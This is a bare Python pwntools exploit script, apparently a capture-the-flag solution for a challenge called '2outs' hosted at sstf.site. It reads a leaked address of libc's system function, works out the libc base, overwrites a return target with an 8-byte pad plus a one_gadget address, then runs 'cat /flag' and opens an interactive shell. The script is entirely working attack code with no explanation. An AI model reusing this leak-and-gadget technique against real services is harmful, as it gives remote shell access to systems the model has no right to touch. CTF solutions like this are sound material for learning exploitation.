from pwn import *

libc = ELF('./libc6_2.35-0ubuntu3.1_amd64.so')

r = remote('2outs.sstf.site', 1337)

ONE_GADGET = 0xebcf8

r.sendlineafter(b'> ', b'system')
r.recvuntil(b'is at ')

SYSTEM_ADDR = int(r.recvline().strip()[:-1], 16)
libc.address = SYSTEM_ADDR - libc.sym['system']

print("[+] System : " + hex(libc.address))

r.sendlineafter(b'> ', b'system')
r.sendlineafter(b'> ', b'A' * 8 + p64(libc.address + ONE_GADGET))

r.sendline(b'cat /flag')
r.interactive()